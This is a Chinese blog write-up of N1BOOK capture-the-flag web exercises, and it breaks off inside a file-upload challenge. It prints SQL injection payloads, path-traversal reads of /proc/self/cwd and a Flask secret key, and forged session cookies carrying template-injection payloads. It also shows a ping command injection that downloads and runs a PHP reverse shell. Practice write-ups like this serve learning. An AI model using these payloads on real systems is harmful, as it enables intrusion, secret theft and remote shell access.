@@ -1,0 +1,284 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>N1BOOK - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="1-4没啥好说的arf_2利用nginx的解析错误
+SQL注入2一个报错注入
+1admin&amp;#x27; and  extractvalue(0x0a,concat(0x0a,(sELect grou,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">N1BOOK</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">N1BOOK</h1>
+        <div class="stuff">
+            <span>十二月 03, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="1-4没啥好说的"><a href="#1-4没啥好说的" class="headerlink" title="1-4没啥好说的"></a>1-4没啥好说的</h1><h1 id="arf-2"><a href="#arf-2" class="headerlink" title="arf_2"></a>arf_2</h1><p>利用nginx的解析错误</p>
+<h1 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h1><p>一个报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;fl4g&#x27;</span>  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h1><p>不会了，学习了。</p>
+<p>当我们读取文件的时候，可以通过读取proc/self/cmdline目录来查看系统执行了什么命令</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/proc/cmdline </span><br><span class="line">在启动时传递至内核的相关参数信息，这些信息通常由lilo或grub等启动管理工具进行传递； </span><br><span class="line"></span><br><span class="line">[root@rhel5 ~]# more /proc/cmdline </span><br><span class="line">ro root=/dev/VolGroup00/LogVol00 rhgb quiet </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20201203143634984.png" alt="image-20201203143634984"></p>
+<p>在这里就能看见server.py了，于是再去proc/self/cwd目录下读取这个文件</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cwd — 指向当前进程运行目录的一个符号链接； </span><br></pre></td></tr></table></figure>
+
+<p>也就是说cwd下可以连接到所有当前正在启动的进程的工作目录</p>
+<p>于是构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3a7463f9-513b-4f61-a0d1-b5ce36abfa59.node3.buuoj.cn&#x2F;article?name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;server.py</span><br></pre></td></tr></table></figure>
+
+<p>得到源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> ( Flask, render_template, request, url_for, redirect, session, render_template_string )</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key</span><br><span class="line"><span class="meta">@app.route(&quot;/n1page&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line">    template = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        template = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(&#x27;/article&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span></span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        template = e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>看见flag被过滤了，读一下key.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Drmhze6EPcv0fN_81Bj-nA</span><br></pre></td></tr></table></figure>
+
+<p>猛测了一波</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.eJyrVsozTM5PSVWyUqquVoiO1YuPT85JLC6Ojweycovy4-OjdQ1BosWlSWCJVKCUhma0qSVIMDMvswSsMj0nPykxB6IrqTQzpyQzD8hRUKitVaoFALt_IyQ.X8irqA.tYkx2Q2zmFaN_M5JnsennKV32nI</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpWzQwXSB9fSJ9.X8isNQ.mwsFCJ2g4ZXyuONHb9SWzKEHrVk</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpIH19In0.X8isRA._rfFegMxGGcZG8hbm0Et10WBnFI</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKSB9fSJ9.X8isYg.HxdhLvdW6lQkPiK3HHLXq7safdU</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">bash: 未预期的符号“(”附近有语法错误</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKCkgfX0ifQ.X8isow.oTg9cFIhfKJan3dvrWECrR8Y4xs</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdIH19In0.X8iswQ.4rU8qOrp7diJa_N5IjdCwm0EvLQ</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;) &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykgfX0ifQ.X8is5w.TImXqmpXkV0tjZzmcVFAIvvFP28</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykucmVhZCgpIH19In0.X8is9Q._7aNNdKqdaXGJ6mbSLLA1W9wjBQ</span><br><span class="line">root@kali:/flask-session-cookie-manager# </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后才成功：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br></pre></td></tr></table></figure>
+
+<h1 id="第二章-web进阶-死亡ping命令"><a href="#第二章-web进阶-死亡ping命令" class="headerlink" title="[第二章 web进阶]死亡ping命令"></a>[第二章 web进阶]死亡ping命令</h1><p>这个题目的ping能够出外网，所以我们只需要用%0a将ping换行绕过</p>
+<p>之后curl [ip]/xxx.php &gt;&gt;/tmp/xx</p>
+<p>php可以写一个反弹shell文件，这里比如我们用P牛的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">&quot;<span class="subst">$IP</span>&quot;</span>, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后我们再执行命令</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0aphp /tmp/xx </span><br></pre></td></tr></table></figure>
+
+<p>即可反弹shell</p>
+<h1 id="第二章-web进阶-文件上传"><a href="#第二章-web进阶-文件上传" class="headerlink" title="[第二章 web进阶]文件上传"></a>[第二章 web进阶]文件上传</h1><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><h3 id="1-apache自带的文件解析漏洞"><a href="#1-apache自带的文件解析漏洞" class="headerlink" title="1.apache自带的文件解析漏洞"></a>1.apache自带的文件解析漏洞</h3><p>如果apache读取文件的时候，后缀为其不可解析的文件名后缀，就会向上追溯，例如我们的apache解析</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa.php.xxx</span><br></pre></td></tr></table></figure>
+
+<p>因为apache无法解析xxx,所以apache就会解析前一个，就是aaa.php了【但是我们访问的时候依然用aaa.php.xxx去访问</p>
+<h3 id="2-逻辑漏洞"><a href="#2-逻辑漏洞" class="headerlink" title="2.逻辑漏洞"></a>2.逻辑漏洞</h3><p>题目是给出源代码的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">// 每5分钟会清除一次目录下上传的文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;pclzip.lib.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_FILES)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;文件上传章节练习题&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;style type=&quot;text/css&quot;&gt;</span></span><br><span class="line"><span class="string">        .login-box&#123;</span></span><br><span class="line"><span class="string">            margin-top: 100px;</span></span><br><span class="line"><span class="string">            height: 500px;</span></span><br><span class="line"><span class="string">            border: 1px solid #000;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        body&#123;</span></span><br><span class="line"><span class="string">            background: white;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        .btn1&#123;</span></span><br><span class="line"><span class="string">            width: 200px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        .d1&#123;</span></span><br><span class="line"><span class="string">            display: block;</span></span><br><span class="line"><span class="string">            height: 400px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;login-box col-md-12&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;form class=&quot;form-horizontal&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;文件上传章节练习题&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;hr /&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;label class=&quot;col-sm-2 control-label&quot;&gt;选择文件：&lt;/label&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;input-group col-sm-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div &gt;</span></span><br><span class="line"><span class="string">                    &lt;label for=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;/label&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-sm-8  text-right&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; class=&quot;btn btn-success text-right btn1&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!$file)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;请勿上传空文件&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = $file[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line">    $ext = strtolower(substr(strrchr($name, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">    $path = $dir.$name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_dir</span>(<span class="params">$dir</span>)</span>&#123;</span><br><span class="line">        $handle = opendir($dir);</span><br><span class="line">        <span class="keyword">while</span>(($f = readdir($handle)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!in_array($f, <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>)))&#123;</span><br><span class="line">                <span class="keyword">if</span>(is_dir($dir.$f))&#123;</span><br><span class="line">                    check_dir($dir.$f.<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">                 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $ext = strtolower(substr(strrchr($f, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">                    <span class="keyword">if</span>(!in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">                        unlink($dir.$f);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $temp_dir = $dir.md5(time(). rand(<span class="number">1000</span>,<span class="number">9999</span>));</span><br><span class="line">    <span class="keyword">if</span>(!is_dir($temp_dir))&#123;</span><br><span class="line">        mkdir($temp_dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">if</span>($ext == <span 